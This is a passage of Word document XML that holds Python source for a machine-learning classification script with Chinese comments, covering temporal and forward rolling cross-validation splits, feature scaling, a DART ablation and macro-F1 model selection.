        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"--split {args.split} 需要 __order__ 列（全局时间序号）。"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671A2562">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "用 tools/build_sample.py 重新生成样本即可。"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B917FED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3070D14C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        order = meta["__order__"].to_numpy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F43A48D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if args.split == "temporal":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3198AB51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("[划分] 按类内部时间顺序留出：每类最早 70% 训练 / 接着 20% 验证 / 最后 10% 测试", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2765A905">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    elif args.split == "temporal-cv":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64DE9978">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        folds = forward_folds(y_enc, order, mcfg["test_size"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5361772F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B84EC8C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"[划分] 前向滚动验证 {len(folds)} 折（开发段切块，训练块逐折递增），"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5817AB0F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"末尾 {mcfg['test_size']:.0%} 留作测试集",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DCBACD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD22BF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F254203">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F44A3B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 滚动验证模式没有单独的 val 段（验证已经分摊到各折里）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CA9CF2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    val_size = 0.0 if folds is not None else mcfg["val_size"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DC70BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X_train, X_val, X_test, y_train, y_val, y_test, scaler = split_and_scale(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C043D8C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X, y_enc, mcfg["test_size"], val_size, seed, order=order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4C4F04">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC4E408">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D361095">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"[划分] train {len(X_train)} / val {len(X_val)} / test {len(X_test)}，"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A04A9F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"共 {len(classes)} 类",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B76725F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F96F37">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06266FE5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2647E0FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if args.dart_ablation:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="426FF1AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        run_dart_ablation(cfg, X_train, y_train, X_test, y_test, classes, seed, out_dir)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5E7471">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F0B911">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C55381F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    targets = args.only or mcfg["candidates"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F24B8A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    cv_scores = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C03F4A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if folds is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2442663F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("[滚动] 前向滚动验证（选择分 = 各折可信 macro-F1 的均值）", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFA2682">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for name in targets:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B51D887">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            scores = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2725EF00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            for tr, va in folds:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CBBBEC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                fold_scaler = StandardScaler().fit(X[tr])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54EE2666">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                fold_model = build_model(name, mcfg, seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A52D7C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                fit_model(fold_model, name, fold_scaler.transform(X[tr]), y_enc[tr])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63737659">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                fold_metrics = evaluate(fold_model, fold_scaler.transform(X[va]), y_enc[va], classes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B3AD82">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                scores.append(selection_score(fold_metrics))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB43C36">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            cv_scores[name] = (float(np.mean(scores)), float(np.std(scores)), scores)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02883D57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7AF0C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"[滚动] {name:&lt;15} 各折 " + " ".join(f"{s:.4f}" for s in scores)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EEEC261">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                + f"  均值 {np.mean(scores):.4f} ± {np.std(scores):.4f}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F4CFD1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71394A54">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A64B589">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47CD6CED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    results = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2234FD2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fitted = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ADCAED7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for name in targets:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35334B29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        model = build_model(name, mcfg, seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2002609E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        t0 = time.perf_counter()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5185F985">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fit_model(model, name, X_train, y_train)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BBBF101">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fit_s = time.perf_counter() - t0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043494B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EE09F95">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 滚动模式没有单独验证段；其余两种模式正常评一次</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE407FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
